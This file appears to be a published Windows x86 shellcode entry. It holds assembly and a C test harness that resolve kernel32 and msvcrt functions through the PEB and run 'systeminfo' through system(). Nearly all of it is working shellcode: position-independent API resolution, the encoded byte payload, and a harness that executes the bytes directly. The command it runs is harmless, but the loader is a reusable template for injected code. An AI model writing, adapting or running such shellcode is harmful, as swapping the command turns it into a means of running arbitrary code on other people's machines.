/*
	# Title : Windows x86 system("systeminfo") shellcode
	# Date : 10-06-2016
	# Author : Roziul Hasan Khan Shifat
	# Tested on : Windows 7 Professional x86

*/

/*


section .text
	global _start
_start:
xor ecx,ecx
mov eax,[fs:ecx+0x30] ;EAX=PEB
mov eax,[eax+0xc] ;EAX=PEB->Ldr
mov esi,[eax+0x14] ;ESI=PEB->Ldr.InMemOrderModuleList
lodsd ; EAX=ntdll.dll
xchg eax,esi ;EAX=ESI , ESI=EAX
lodsd ; EAX=Third(kernel32)
mov ebx,[eax+0x10] ;PVOID Dllbase (base address)

;-------------------------------

mov edx,[ebx+0x3c] ;(kernel32.dll base address+0x3c)=DOS->e_lfanew
add edx,ebx ;(DOS->e_lfanew+kernel32.dll base address)=PE Header
mov edx,[edx+0x78] ;(PE Header+0x78)=DataDirectory->VirtualAddress
add edx,ebx ;(DataDirectory->VirtualAddress+kernel32.dll base address)=export table of kernel32.dll(IMAGE_EXPORT_DIRECTORY)
mov esi,[edx+0x20]; (IMAGE_EXPORT_DIRECTORY+0x20)=AddressOfNames
add esi,ebx ;ESI=(AddressOfNames+kernel32.dll base address)=kernel32 AddressOfNames
xor ecx,ecx
;-----------------------

Get_func:
inc ecx ;increment the ordinal
lodsd ;Get name offset
add eax,ebx ;(offset+kernel32.dll base adress)=Get function name
cmp dword [eax],0x50746547 ;GetP
jnz Get_func
cmp dword [eax+0x4],0x41636f72 ;rocA
jnz Get_func
cmp dword [eax+0x8],0x65726464 ;ddre
jnz Get_func

;---------------------

mov esi,[edx+0x24] ;(IMAGE_EXPORT_DIRECTORY+0x24) AddressOfNameOrdinals

add esi,ebx ;ESI=(AddressOfNameOrdinals+kernel32.dll)=AddressOfNameOrdinals of kernel32.dll

mov cx,[esi+ecx*2] ;CX=Number of Function
dec ecx
mov esi,[edx+0x1c] ; (IMAGE_EXPORT_DIRECTORY+0x1c)=AddressOfFunctions

add esi,ebx ;ESI=beginning of Address table
mov edx,[esi+ecx*4];EDX=Pointer(offset)
add edx,ebx ;Edx=GetProcAddress


;------------------------------

xor esi,esi
mov esi,edx
;-------------------------------
;finding address of LoadLibraryA
xor ecx,ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c

mov ecx,esp

push ecx
push ebx

call edx

;-------------------------------------
;finding address of msvcrt.dll
xor ecx,ecx

mov cx, 0x6c6c
push ecx
push 0x642e7472
push 0x6376736d

mov ecx,esp
push ecx
call eax
;----------------------------

xor edi,edi
mov edi,eax ; base address of msvcrt.dll
;----------------------------
;finding address of system()
xor edx,edx
push edx
mov dx,  0x6d65
push edx
push 0x74737973
mov ecx,esp
push ecx
push edi
xor edx,edx
mov edx,esi
call edx
;-------------------------

xor ecx,ecx
mov cx, 0x6f66
push ecx
push 0x6e696d65
push 0x74737973
mov ecx,esp
push ecx
call eax ;calling system()

;-------------------------------
;finding address of _getch()
xor ecx,ecx
mov cx, 0x6863
push ecx
push 0x7465675f

mov ecx,esp

push ecx
push edi
xor edx,edx
mov edx,esi
call edx

;--------------------
call eax ;calling _getch()
;---------------------

;---------------------------
;finding address of exit()
xor edx,edx
push edx
push 0x74697865
mov ecx,esp
push ecx
push edi
call esi
;----------------------
call eax ;exiting




*/



#include<stdio.h>
#include<string.h>
char shellcode[]=\
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x89\xd6\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x89\xe1\x51\x53\xff\xd2\x31\xc9\x66\xb9\x6c\x6c\x51\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x89\xe1\x51\xff\xd0\x31\xff\x89\xc7\x31\xd2\x52\x66\xba\x65\x6d\x52\x68\x73\x79\x73\x74\x89\xe1\x51\x57\x31\xd2\x89\xf2\xff\xd2\x31\xc9\x66\xb9\x66\x6f\x51\x68\x65\x6d\x69\x6e\x68\x73\x79\x73\x74\x89\xe1\x51\xff\xd0\x31\xc9\x66\xb9\x63\x68\x51\x68\x5f\x67\x65\x74\x89\xe1\x51\x57\x31\xd2\x89\xf2\xff\xd2\xff\xd0\x31\xd2\x52\x68\x65\x78\x69\x74\x89\xe1\x51\x57\xff\xd6\xff\xd0";


main()
{
printf("shellcode length %ld\n",strlen(shellcode));
(* (int(*)()) shellcode)();
}